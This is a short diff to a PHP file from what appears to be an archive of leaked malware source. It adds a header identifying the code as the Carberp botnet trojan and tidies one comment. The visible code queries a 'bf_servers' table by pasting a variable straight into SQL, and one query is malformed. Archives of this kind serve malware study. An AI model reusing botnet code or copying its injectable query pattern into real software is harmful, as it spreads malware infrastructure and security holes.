@@ -1,4 +1,15 @@
 #!/usr/bin/env php
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 error_reporting(-1);
@@ -40,7 +51,8 @@ $mysqli->query('update bf_servers set `status` = \'0\' WHERE (id = \''.$num.'\')
 
 $server = $mysqli->query('select id, status bf_servers where (id = \''.$num.'\') limit 1');
 
-if($server->id == $num){	//dfG
+if($server->id == $num){
+	//dfG
 }
 
 /*
